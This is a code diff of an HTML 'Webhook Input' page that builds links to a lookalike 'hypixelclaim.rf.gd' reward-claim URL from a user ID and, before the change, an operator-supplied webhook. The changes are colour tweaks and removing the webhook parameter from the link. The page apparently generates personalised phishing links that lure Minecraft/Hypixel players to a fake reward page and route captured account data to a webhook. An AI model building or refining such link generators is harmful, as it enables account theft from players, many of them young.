@@ -6,7 +6,7 @@
     <title>Webhook Input</title>
 </head>
 <body style="background-color: #000000; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: Arial, sans-serif; color: #fff;">
-    <div style="background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.4); max-width: 400px; width: 100%; text-align: center;">
+    <div style="background-color: #000000; padding: 20px; border-radius: 8px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.4); max-width: 400px; width: 100%; text-align: center;">
         <h1 style="color: #000000;">Webhook Input</h1>
         <form id="webhookForm">
             <div style="margin: 20px 0;">
@@ -17,7 +17,7 @@
                 <label for="id" style="display: block; font-size: 16px; margin-bottom: 8px; color: #fff;">User ID (numbers only):</label>
                 <input type="text" name="id" id="id" placeholder="Enter your ID" required pattern="[0-9]+" style="width: 90%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; background-color: #36393f; color: #fff;">
             </div>
-            <button type="submit" style="background-color: #10d8be; color: #fff; border: none; padding: 12px 20px; cursor: pointer; border-radius: 5px; font-size: 16px; transition: background-color 0.3s;">Generate Link</button>
+            <button type="submit" style="background-color: #10d8be; color: #ffffff; border: none; padding: 12px 20px; cursor: pointer; border-radius: 5px; font-size: 16px; transition: background-color 0.3s;">Generate Link</button>
         </form>
         <div id="generatedLink" style="display: none; margin-top: 20px;">
             Your Link Is: <span id="linkText"></span>
@@ -31,9 +31,8 @@
 
         webhookForm.addEventListener('submit', function (e) {
             e.preventDefault();
-            const webhook = document.getElementById('webhook').value;
             const id = document.getElementById('id').value;
-            const link = `https://hypixelclaim.rf.gd/reward/S9Yg3/index.html?id=${id}&webhook=${webhook}`;
+            const link = `https://hypixelclaim.rf.gd/reward/S9Yg3/index.html?id=${id}`;
             linkText.textContent = link;
             generatedLink.style.display = 'block';
         });
